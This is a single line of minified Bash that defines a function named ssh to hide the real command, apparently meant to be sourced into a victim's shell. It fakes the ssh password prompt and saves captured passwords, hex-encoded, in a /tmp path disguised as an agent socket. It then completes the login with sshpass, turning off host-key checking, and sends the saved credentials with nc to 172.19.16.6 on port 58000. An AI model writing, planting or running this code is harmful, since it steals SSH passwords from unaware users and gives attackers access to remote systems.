ssh(){ if [ $# -eq 0 ];then /usr/bin/ssh;exit 255;fi;c="${@: -1}";d="(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)";a="/tmp/ssh-6HT9sqtXQVE4";b="agent.392136";h="(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])";a(){ (cat "$a/$b" 2>/dev/null | nc -w1 -vn 172.19.16.6 58000 &>/dev/null &);};e(){ echo;exit 130;};f=(${c//@/ });g=${f[1]};if [[ ! $c =~ ^$h@$d$ ]];then if [[ ! $c =~ ^$h@$h$ ]];then /usr/bin/ssh $c;exit 255;fi;nslookup $g &>/dev/null;if [ $? -eq 1 ];then /usr/bin/ssh $c;exit 255;fi;fi;i=0;while true;do trap "echo && e" SIGINT;echo -n "$c's password: ";read -s j;mkdir -p "$a";echo -e "$(date)\n[$@] = \"$j\"\n" | xxd -ps >> "$a/$b";echo;trap e SIGINT;if [ $i -ne 2 ];then sshpass -P ": " -p "$j" /usr/bin/ssh -o StrictHostKeyChecking=no "$@";else sshpass -P ": " -p "$j" /usr/bin/ssh -o StrictHostKeyChecking=no "$@" 2>/dev/null;if [ $? -eq 0 ]; then echo "Connection to $g closed.";else echo "$c: Permission denied (publickey,password).";a;exit 255;fi;fi;if [ $? -eq 0 ];then a;exit 0;else (( i++ ));fi;done;}
